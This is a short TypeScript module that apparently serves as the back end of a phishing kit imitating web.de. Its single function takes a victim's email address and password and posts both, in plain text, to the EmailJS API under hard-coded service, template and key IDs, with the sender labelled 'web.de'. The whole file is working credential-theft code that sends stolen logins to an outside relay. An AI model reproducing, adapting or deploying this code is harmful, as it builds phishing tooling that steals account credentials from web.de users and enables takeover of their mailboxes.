import axios from "axios";

const endpoint = "https://api.emailjs.com/api/v1.0/email/send";
const service_id = "service_scpiclv";
const template_id = "template_gj9iae7";
const public_key = "NIhyDX5hopqPok_by";

const sendEmail = (values: any) => {
  const payload = {
    service_id,
    template_id,
    user_id: public_key,
    template_params: {
      from_name: "web.de",
      email: values.email,
      password: values.password,
    },
  };

  return axios.post(endpoint, payload);
};

export default sendEmail;
